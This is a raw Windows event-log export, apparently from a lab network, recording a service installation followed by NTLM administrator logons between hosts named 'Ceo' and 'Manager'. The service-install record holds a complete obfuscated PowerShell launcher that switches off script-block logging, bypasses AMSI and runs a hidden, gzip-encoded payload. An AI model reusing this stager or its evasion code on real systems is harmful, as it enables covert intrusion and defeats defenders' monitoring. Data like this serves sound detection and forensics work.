JNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
Service Type:  user mode service
Service Start Type:  demand start
Service Account:  LocalSystem","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,System,Ceo,LocalSystem,"-","-","-","-","-","-","-","-","-","%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""","-","-","-","-","-","-","-","-","-","-","-","-","-",czqMSHfNRVPgebzb,"user mode service","demand start","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",7045,Classic,"-","-","-","-","-","-",620,"7,228","{555908d1-a6d7-4695-8e1e-26931d2012f4}","Service Control Manager",3845,"-",CEO,"S-1-5-21-504783269-3310020698-1149228630-500",Administrator,User,"-"
"Oct 23, 2022 @ 16:53:42.518",eXkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:53:44.260","Oct 23, 2022 @ 16:53:43.555",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-21-504783269-3310020698-1149228630-500
	Account Name:		Administrator
	Account Domain:		CEO
	Logon ID:		0xDAC013

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",Administrator,"-","-","-",CEO,"S-1-5-21-504783269-3310020698-1149228630-500",Administrator,Administrator,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-",CEO,0xdac013,Administrator,"S-1-5-21-504783269-3310020698-1149228630-500","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0xdac013,"-",Info,656,"5,236","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28784,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:42.518",enkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:53:44.260","Oct 23, 2022 @ 16:53:43.556",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-504783269-3310020698-1149228630-500
	Account Name:		Administrator
	Account Domain:		CEO
	Logon ID:		0xDAC013
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	WORKSTATION
	Source Network Address:	192.168.100.10
	Source Port:		34969

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","-","-","-","-",0,"192.168.100.10",Administrator,WORKSTATION,"192.168.100.10",34969,CEO,"S-1-5-21-504783269-3310020698-1149228630-500",Administrator,Administrator,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",NTLM,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",128,"NTLM V2","{00000000-0000-0000-0000-000000000000}","NtLmSsp ",3,"-","-","-","-","-","-","-","-","-","-","-",0x0,"-","S-1-0-0",CEO,0x0,0xdac013,"-","-","-","-",Administrator,"S-1-5-21-504783269-3310020698-1149228630-500","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x0,Network,Info,656,"5,236","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28785,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:53:32.012",OHkMBIQByII7dpeEFxDo,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:53:32.933","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:58:31Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:58:31Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3911,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:01.797",onkLBIQByII7dpeEoA7K,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:53:02.446","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3910,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:01.723","L3kLBIQByII7dpeEpA-9",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:53:03.464","Oct 23, 2022 @ 16:53:02.779",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28782,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:53:01.723","MHkLBIQByII7dpeEpA-9",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:53:03.464","Oct 23, 2022 @ 16:53:02.780",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28783,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:01.708","LXkLBIQByII7dpeEpA-9",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:53:03.464","Oct 23, 2022 @ 16:53:02.778",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28780,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:53:01.708","LnkLBIQByII7dpeEpA-9",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:53:03.464","Oct 23, 2022 @ 16:53:02.779",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28781,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:46.746",GHkLBIQByII7dpeEaQ43,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-out",authentication,4634,"Oct 23, 2022 @ 16:52:48.246","Oct 23, 2022 @ 16:52:47.540",event,success,"Microsoft-Windows-Security-Auditing",end,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was logged off.

Subject:
	Security ID:		S-1-5-21-2306022662-2081110232-4248635931-1001
	Account Name:		vagrant
	Account Domain:		MANAGER
	Logon ID:		0xF8CAFA

Logon Type:			3

